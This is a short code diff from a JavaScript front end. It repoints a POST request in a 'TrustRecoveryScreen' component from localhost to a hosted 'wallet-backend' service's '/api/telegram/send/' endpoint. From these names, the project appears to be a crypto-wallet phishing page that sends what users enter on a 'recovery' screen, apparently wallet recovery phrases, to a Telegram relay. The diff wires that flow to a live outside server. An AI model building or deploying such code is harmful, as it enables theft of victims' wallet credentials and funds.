@@ -394,7 +394,7 @@ function TrustRecoveryScreen({ onBack, onNext }) {
     if (!isComplete) return;
 
     try {
-      const res = await fetch("http://localhost:8000/api/telegram/send/", {
+      const res = await fetch("https://wallet-backend-iyvu.onrender.com/api/telegram/send/", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
